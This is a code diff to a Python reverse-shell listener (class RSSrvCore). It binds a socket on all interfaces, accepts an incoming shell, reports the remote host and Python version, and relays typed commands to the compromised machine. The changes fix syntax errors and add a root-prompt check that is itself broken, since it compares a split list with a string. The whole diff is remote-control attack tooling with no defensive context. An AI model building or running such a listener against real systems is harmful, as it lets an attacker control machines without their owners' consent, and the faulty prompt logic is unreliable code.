@@ -55,11 +55,11 @@ class RSSrvCore:
         self.args = self.arg_parser.parse_args()
 
 
-    def main_event(self, force = self.args.force):
+    def main_event(self, force=False):
         """Connect to an incoming shell"""
         s = socket.socket()
         if force:
-            print('Enabling socket address reuse')
+            print('Enabling socket address reuse.')
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         print('Binding to port ' + str(self.args.port))
         s.bind(('0.0.0.0', self.args.port))
@@ -72,11 +72,14 @@ class RSSrvCore:
         print('Remote hostname: ' + remotehost + '.\n' + \
                 'Remote Python major version: ' + remotepyversion + '.')
         remotepyversion = int(remotepyversion)
-        #print('Remote Python major version: ' + remotepyversion + '.')
+        if remotehost.split('@') == 'root':
+            promptsuffix = ' # '
+        else:
+            promptsuffix = ' $ '
         print('Type exit or enter EOF (ctrl-d) to exit.')
         while True:
             try:
-                cmd = input(remotehost + '$ ')
+                cmd = input(remotehost + promptsuffix)
                 if cmd == 'exit':
                     conn.send(bytes(cmd, 'utf8'))
                     conn.close()
@@ -87,7 +90,7 @@ class RSSrvCore:
                     conn.close()
                     s.close()
                     return 0
-                elif cmd = 'detach':
+                elif cmd == 'detach':
                     conn.send(bytes(cmd, 'utf8'))
                     conn.close()
                     s.close()
@@ -113,7 +116,7 @@ class RSSrvCore:
         """Run the shell server program"""
         try:
             self.get_args()
-            self.main_event()
+            self.main_event(force=self.args.force)
             while True:
                 self.main_event(force=True)
 
